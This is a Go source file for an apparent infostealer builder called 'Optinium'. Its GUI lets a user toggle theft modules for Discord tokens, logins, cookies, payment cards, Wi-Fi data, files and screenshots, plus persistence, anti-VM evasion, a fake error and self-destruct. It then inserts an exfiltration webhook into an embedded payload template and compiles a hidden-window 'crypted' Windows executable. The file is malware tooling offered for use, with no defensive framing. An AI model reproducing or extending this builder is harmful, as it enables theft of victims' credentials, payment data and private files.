package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/sqweek/dialog"
	webview "github.com/webview/webview_go"
)

//go:embed lib/index.html
var html string

//go:embed lib/payload.go
var payloadBase string

//go:embed lib/optinium.go
var optinium string

var (
	options = map[string]bool{
		"SystemData":   false,
		"DiscordData":  false,
		"LoginData":    false,
		"VisitedURLs":  false,
		"SelfDestruct": false,
		"FakeError":    false,
		"IpData":       false,
		"CardData":     false,
		"WifiData":     false,
		"Screenshot":   false,
		"Snapshot":     false,
		"Persist":      false,
		"AntiVM":       false,
		"StealFiles":   false,
		"CookieData":   false,
		"Sleep":        false,
	}

	exclude = []string{"SelfDestruct", "FakeError", "Screenshot", "Snapshot", "Persist", "AntiVM", "StealFiles", "Sleep"}
)

func run(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func in(option string, slice []string) bool {
	for _, i := range slice {
		if option == i {
			return true
		}
	}
	return false
}

func compile(payload string) []byte {
	os.Mkdir("build", 0644)
	os.Chdir("build")

	os.WriteFile("build.go", []byte(payload), 0644)

	os.Mkdir("optinium", 0644)
	os.WriteFile("optinium/optinium.go", []byte(optinium), 0644)

	run("go.exe", "mod", "init", "main")
	run("go.exe", "mod", "tidy")
	run("go.exe", "build", "-trimpath", "--ldflags", "-s -w -H windowsgui -buildid=", "build.go")

	data, _ := os.ReadFile("build.exe")

	os.Chdir("..")
	os.RemoveAll("build")

	return data
}

func build(webhook string) {
	payload := strings.Replace(payloadBase, "<WEBHOOK>", webhook, 1)

	for option, value := range options {
		if value {
			if in(option, exclude) {
				switch option {
				case "SelfDestruct":
					payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("defer optinium.%v()", option), 1)
				default:
					payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("optinium.%v()", option), 1)
				}

			} else {
				payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("DATA.WriteString(optinium.%v())", option), 1)
			}
		} else {
			payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), "", 1)
		}
	}

	data := compile(payload)

	path, _ := dialog.File().Filter("Executable Files", "exe").Title("Save crypted file").SetStartFile("payload.exe").Save()
	os.WriteFile(path, data, 0644)

	exec.Command("explorer.exe", filepath.Dir(path)).Start()
}

func main() {
	window := webview.NewWindow(false, nil)
	window.SetSize(600, 700, webview.HintFixed)
	window.SetTitle("Optinium | Main")

	window.SetHtml(html)

	window.Bind("toggleState", func(id string) {
		options[id] = !options[id]
	})

	window.Bind("buildExe", func(webhook string) {
		go build(webhook)
	})

	window.Run()
}
